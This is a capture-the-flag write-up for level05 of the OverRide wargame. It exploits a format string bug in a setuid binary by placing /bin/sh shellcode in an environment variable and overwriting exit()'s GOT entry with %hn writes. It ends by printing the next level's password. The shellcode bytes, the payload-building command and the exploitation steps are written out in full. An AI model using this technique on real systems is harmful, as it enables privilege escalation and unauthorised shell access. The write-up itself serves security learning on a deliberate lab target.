Level05 protections:
```Shell
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/users/level05/level05
```

Level05 rights:
```Shell
level05@OverRide:~$ ls -la level05 
-rwsr-s---+ 1 level06 users 5176 Sep 10  2016 level05
```

Testing the binary:
```Shell
level05@OverRide:~$ ./level05
COUCOU
coucou
```

Decompiling with Hex-Rays on https://dogbolt.org/ shows three things:
- the program converts input from uppercase to lowercase, if it's part of the ASCII table
- a format string attack is possible because of an unsafe `printf()` call
- the program ends with a call to `exit()`.

Our solution will consist of storing a shellcode inside an environment variable and overwrite `exit()` with its address. We need to export the shellcode, otherwise any values corresponding to an uppercase letter in ASCII will be modified by the program. So the goal is to use the `%n` specifier, with which we will send the address of the environment variable as a decimal number and store it inside the `exit()` call.

First, let's export our shellcode:
```Shell
export SHELLCODE=`python -c 'print("\x90" * 100 + "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80")'`
```

Now, let's retrieve the address of a random NOP instruction inside our environment variable:
```Shell
(gdb) x/s *((char **)environ)
0xffffd872:      "SHELLCODE=[...]
```

Writing the address in one go is impossible because it exceeds the capacity of an `int`, therefore crashing `%d` and `%n` (as `%n` takes an `*int` as argument). We are forced to divide it and store each part in a `short int`, aka `%hn`.
So our payload will consist in:
[first two bytes of the address of `exit()`] + [last two bytes of the address of `exit()`] (reversed to little endian)
and then
%[last bytes of the address of our shellcode in decimal]d + %[the index on the stack]$hn + %[first bytes of the address of our shellcode in decimal]d + %[the index on the stack]$hn
```Shell
python -c 'print("\x08\x04\x97\xe0"[::-1] + "\x08\x04\x97\xe2"[::-1] + "%55414d" + "%10$hn" + "%10113d" + "%11$hn")' > /tmp/payload06
```

The address of the environment variable storing our shellcode is 0xffffd872, we will add 12 (0xffffd87e) to be sure this address correspond to a NOP instruction, which gives us, in decimal:
ffff = 65535 / d87e = 55422
Since we're in little endian, we start with `d87e`, minus 8 (because of the 8 bytes of the address of `exit()`): 55414.
Then, for `ffff` minus 8 and minus 55414, so we get: 10113.
We will place each value next to each other on the stack, therefore they will be placed at index 10 and index 11, respectively.

```Shell
level05@OverRide: cat /tmp/payload06 - | ./level05
[...]
        -134415680
cat /home/users/level06/.pass
h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
```